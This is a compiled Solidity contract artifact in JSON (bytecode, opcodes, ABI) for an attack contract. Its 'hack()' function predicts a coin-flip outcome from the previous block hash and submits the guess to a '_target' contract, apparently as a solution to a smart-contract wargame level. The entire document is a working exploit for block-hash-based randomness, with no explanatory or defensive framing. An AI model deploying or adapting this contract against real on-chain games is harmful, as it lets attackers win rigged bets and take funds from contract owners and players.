{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60a060405234801561000f575f5ffd5b50604051610703380380610703833981810160405281019061003191906100c9565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506100f4565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100988261006f565b9050919050565b6100a88161008e565b81146100b2575f5ffd5b50565b5f815190506100c38161009f565b92915050565b5f602082840312156100de576100dd61006b565b5b5f6100eb848285016100b5565b91505092915050565b6080516105f761010c5f395f61014c01526105f75ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80634de260a214610038578063e4629f3414610056575b5f5ffd5b610040610074565b60405161004d91906102d9565b60405180910390f35b61005e61022f565b60405161006b91906102d9565b60405180910390f35b5f5f6001436100839190610328565b405f1c90505f81036100ca576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100c1906103b5565b60405180910390fd5b5f54810361010d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101049061041d565b60405180910390fd5b805f819055505f7f8000000000000000000000000000000000000000000000000000000000000000826101409190610468565b90505f6001821490505f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16631d263f67836040518263ffffffff1660e01b81526004016101a391906102d9565b6020604051808303815f875af11580156101bf573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101e391906104c6565b905080610225576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161021c9061053b565b60405180910390fd5b8094505050505090565b5f5f60014361023e9190610328565b405f1c90505f8103610285576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161027c906105a3565b60405180910390fd5b5f7f8000000000000000000000000000000000000000000000000000000000000000826102b29190610468565b9050600181149250505090565b5f8115159050919050565b6102d3816102bf565b82525050565b5f6020820190506102ec5f8301846102ca565b92915050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610332826102f2565b915061033d836102f2565b9250828203905081811115610355576103546102fb565b5b92915050565b5f82825260208201905092915050565b7f5761697420666f7220746865206e65787420626c6f636b0000000000000000005f82015250565b5f61039f60178361035b565b91506103aa8261036b565b602082019050919050565b5f6020820190508181035f8301526103cc81610393565b9050919050565b7f416c72656164792063616c6c656420666f72207468697320626c6f636b0000005f82015250565b5f610407601d8361035b565b9150610412826103d3565b602082019050919050565b5f6020820190508181035f830152610434816103fb565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610472826102f2565b915061047d836102f2565b92508261048d5761048c61043b565b5b828204905092915050565b5f5ffd5b6104a5816102bf565b81146104af575f5ffd5b50565b5f815190506104c08161049c565b92915050565b5f602082840312156104db576104da610498565b5b5f6104e8848285016104b2565b91505092915050565b7f43616c6c20746f20746172676574206661696c656400000000000000000000005f82015250565b5f61052560158361035b565b9150610530826104f1565b602082019050919050565b5f6020820190508181035f83015261055281610519565b9050919050565b7f426c6f636b2068617368206e6f7420617661696c61626c6500000000000000005f82015250565b5f61058d60188361035b565b915061059882610559565b602082019050919050565b5f6020820190508181035f8301526105ba81610581565b905091905056fea26469706673582212207a2e9c05c4e6a39d1125ba8164b902cd16c66af28807bff525e1c4000c826a3b64736f6c634300081e0033",
			"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x703 CODESIZE SUB DUP1 PUSH2 0x703 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xC9 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0xF4 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x98 DUP3 PUSH2 0x6F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xA8 DUP2 PUSH2 0x8E JUMP JUMPDEST DUP2 EQ PUSH2 0xB2 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xC3 DUP2 PUSH2 0x9F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xDE JUMPI PUSH2 0xDD PUSH2 0x6B JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xEB DUP5 DUP3 DUP6 ADD PUSH2 0xB5 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH2 0x5F7 PUSH2 0x10C PUSH0 CODECOPY PUSH0 PUSH2 0x14C ADD MSTORE PUSH2 0x5F7 PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xE4629F34 EQ PUSH2 0x56 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x74 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x2D9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x5E PUSH2 0x22F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6B SWAP2 SWAP1 PUSH2 0x2D9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x83 SWAP2 SWAP1 PUSH2 0x328 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 DUP2 SUB PUSH2 0xCA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC1 SWAP1 PUSH2 0x3B5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 SLOAD DUP2 SUB PUSH2 0x10D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x104 SWAP1 PUSH2 0x41D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH0 DUP2 SWAP1 SSTORE POP PUSH0 PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x140 SWAP2 SWAP1 PUSH2 0x468 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ SWAP1 POP PUSH0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1A3 SWAP2 SWAP1 PUSH2 0x2D9 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1BF JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1E3 SWAP2 SWAP1 PUSH2 0x4C6 JUMP JUMPDEST SWAP1 POP DUP1 PUSH2 0x225 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x21C SWAP1 PUSH2 0x53B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP5 POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x23E SWAP2 SWAP1 PUSH2 0x328 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 DUP2 SUB PUSH2 0x285 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x27C SWAP1 PUSH2 0x5A3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x2B2 SWAP2 SWAP1 PUSH2 0x468 JUMP JUMPDEST SWAP1 POP PUSH1 0x1 DUP2 EQ SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2D3 DUP2 PUSH2 0x2BF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2EC PUSH0 DUP4 ADD DUP5 PUSH2 0x2CA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x332 DUP3 PUSH2 0x2F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x33D DUP4 PUSH2 0x2F2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x355 JUMPI PUSH2 0x354 PUSH2 0x2FB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x5761697420666F7220746865206E65787420626C6F636B000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x39F PUSH1 0x17 DUP4 PUSH2 0x35B JUMP JUMPDEST SWAP2 POP PUSH2 0x3AA DUP3 PUSH2 0x36B JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x3CC DUP2 PUSH2 0x393 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x416C72656164792063616C6C656420666F72207468697320626C6F636B000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x407 PUSH1 0x1D DUP4 PUSH2 0x35B JUMP JUMPDEST SWAP2 POP PUSH2 0x412 DUP3 PUSH2 0x3D3 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x434 DUP2 PUSH2 0x3FB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x472 DUP3 PUSH2 0x2F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x47D DUP4 PUSH2 0x2F2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x48D JUMPI PUSH2 0x48C PUSH2 0x43B JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x4A5 DUP2 PUSH2 0x2BF JUMP JUMPDEST DUP2 EQ PUSH2 0x4AF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x4C0 DUP2 PUSH2 0x49C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x4DB JUMPI PUSH2 0x4DA PUSH2 0x498 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x4E8 DUP5 DUP3 DUP6 ADD PUSH2 0x4B2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x43616C6C20746F20746172676574206661696C65640000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x525 PUSH1 0x15 DUP4 PUSH2 0x35B JUMP JUMPDEST SWAP2 POP PUSH2 0x530 DUP3 PUSH2 0x4F1 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x552 DUP2 PUSH2 0x519 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x426C6F636B2068617368206E6F7420617661696C61626C650000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x58D PUSH1 0x18 DUP4 PUSH2 0x35B JUMP JUMPDEST SWAP2 POP PUSH2 0x598 DUP3 PUSH2 0x559 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x5BA DUP2 PUSH2 0x581 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH27 0x2E9C05C4E6A39D1125BA8164B902CD16C66AF28807BFF525E1C400 0xC DUP3 PUSH11 0x3B64736F6C634300081E00 CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "305400",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"hack()": "infinite",
				"predict()": "infinite"
			}
		},
		"methodIdentifiers": {
			"hack()": "4de260a2",
			"predict()": "e4629f34"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_target",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "hack",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "predict",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "view",
			"type": "function"
		}
	]
}